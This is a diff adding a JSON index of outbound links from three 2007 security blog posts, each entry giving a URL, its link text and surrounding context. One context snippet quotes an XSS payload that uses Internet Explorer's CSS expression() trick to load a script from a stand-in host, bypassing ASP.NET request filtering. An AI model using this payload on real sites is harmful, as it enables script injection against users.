@@ -1,0 +1,28 @@
+{
+ "2007-05-15-evaluating-the-security-of-the-jsonrequest-object.md": [
+  {
+   "url": "http://json.org/JSONRequest.html",
+   "text": "proposed extension",
+   "context": "<p>A <a href=\"http://json.org/JSONRequest.html\">proposed extension</a> to the currently supported set of ...Request objects is JSONRequest, interesting from a securi"
+  }
+ ],
+ "2007-05-15-bypass-asp-net-xss-protection-in-internet-explorer.md": [
+  {
+   "url": "http://www.site.com/JS.js",
+   "text": null,
+   "context": "=\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://www.site.com/JS.js')\"> {% endhighlight %} <p>Turns out that IE will still process attributes on closing tags which circumvents the filter for &lt;a whil"
+  },
+  {
+   "url": "http://sla.ckers.org/forum/read.php?2,7462,8409%23msg-8409",
+   "text": "sla.ckers",
+   "context": "as a null comment but obviously breaking .NET's filter regex. Thanks to Hong @ <a href=\"http://sla.ckers.org/forum/read.php?2,7462,8409%23msg-8409\">sla.ckers</a>.</p>"
+  }
+ ],
+ "2007-05-15-amendments-to-the-british-computer-misuse-act.md": [
+  {
+   "url": "http://www.gnucitizen.org/blog/changes-in-the-british-computer-misuse-act",
+   "text": "interesting post",
+   "context": "<p>pdp has an <a href=\"http://www.gnucitizen.org/blog/changes-in-the-british-computer-misuse-act\">interesting post</a> from last month about amendments to the British Compute"
+  }
+ ]
+}
